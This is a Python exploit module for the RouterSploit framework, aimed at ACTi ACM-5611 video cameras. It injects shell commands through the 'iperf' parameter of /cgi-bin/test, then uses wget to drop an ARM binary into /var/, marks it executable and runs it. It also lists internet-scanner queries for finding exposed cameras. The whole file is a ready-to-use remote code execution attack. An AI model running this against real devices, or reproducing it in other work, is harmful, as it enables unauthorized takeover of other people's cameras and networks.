from routersploit.core.exploit import *
from routersploit.core.exploit import shell
from routersploit.core.exploit.option import OptIP, OptPort
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "ACTi ACM-5611 Video Camera RCE",
        "description": "Module exploits ACTi ACM-5611 Video Camera Remote Command Execution Exploit",
        "authors": (
            "Todor Donev <todor.donev@gmail.com>",  # vulnerability discovery
            "GH0st3rs",  # routersploit module
        ),
        "references": (
            "https://www.exploitalert.com/view-details.html?id=34128",
            "https://packetstormsecurity.com/files/154626/ACTi-ACM-5611-Video-Camera-Remote-Command-Execution.html",
        ),
        "devices": (
            "ACM5611-08G-X-00485",
        ),
        "search": (
            'Shodan search: title:"Web Configurator" http.html:"ACTi"',
            'Censys search: services.http.response.html_title:"Web Configurator" and services.http.response.body:"ACTi"',
            'Zoomeye search: title:"Web Configurator" +"ACTi"',
            'Fofa search title="Web Configurator" && body="ACTi"',
        )
    }
    
    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(8080, "Target HTTP port")

    def execute(self, cmd: str) -> str:
        response = self.http_request(
            method="GET",
            path="/cgi-bin/test",
            params={'iperf': f';{cmd}'},
            headers={"Content_Type": "application/x-www-form-urlencoded", "Referer": f'http://{self.target}:{self.port}'}
        )
        if response and response.status_code == 200:
            return response.text
        return ''

    def check(self) -> bool:
        response = self.http_request(method="GET", path="/cgi-bin/test")
        if response:
            response = self.http_request(method='GET', path='/')
            if response and 'Web Configurator' in response.text:
                return True
        return False

    def run(self):
        if self.check():
            print_success("Target seams %s:%d is vulnerable", self.target, self.port)
            shell(
                self,
                architecture="armle",
                method="wget",
                location="/var/",
                exec_binary=['chmod 777 {}', '{}']
            )
            # print_status('Target: %s:%d => output: "%s"', self.target, self.port, self.execute(self.command))
        else:
            print_error("Exploit failed - target %s:%d seems to be not vulnerable", self.target, self.port)
